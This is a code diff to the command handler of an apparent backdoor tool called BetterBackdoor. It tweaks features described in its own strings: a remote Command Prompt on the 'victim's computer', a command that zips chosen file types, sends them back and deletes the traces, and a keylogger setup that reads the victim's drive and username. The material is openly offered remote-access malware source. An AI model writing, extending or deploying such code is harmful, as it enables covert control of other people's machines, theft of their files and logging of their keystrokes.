@@ -23,7 +23,8 @@ public class HandleCommand {
 				System.out.println(
 						"Commands will now be executed through vitim's computer's Command Prompt\nEnter 'back' to go back");
 				while (true) {
-					System.out.print("cmd");
+					Shell.out.writeObject("current-cmd-dir");
+					System.out.print(getResp());
 					String cmdCommand = BetterBackdoor.getInput("");
 					if (cmdCommand.equals("back"))
 						break;
@@ -54,8 +55,8 @@ public class HandleCommand {
 			}
 			case "exfiles": {
 				System.out.println(
-						"This will copy files with desired extensions from a folder and all it's subfolders to a ZIP file, send the ZIP file to this computer, and delete the" +
-								" original ZIP file from the victim's computer.");
+						"This will copy files with desired extensions from a folder and all it's subfolders to a ZIP file, send the ZIP file to this computer, " +
+								"and delete the original ZIP file from the victim's computer.");
 				System.out.println("Enter victim's directory to search through:");
 				String root = BetterBackdoor.getInput("");
 				Shell.out.writeObject("filetype " + root);
@@ -138,9 +139,9 @@ public class HandleCommand {
 				break;
 			}
 			case "keylog":
-				Shell.out.writeObject("cmd echo %CD:~0,2%");
+				Shell.out.writeObject("current-dir");
 				Shell.out.flush();
-				String currentDrive = getResp();
+				String currentDrive = getResp().substring(0, 2);
 				Shell.out.writeObject("cmd echo %USERNAME%");
 				Shell.out.flush();
 				String currentUser = getResp();
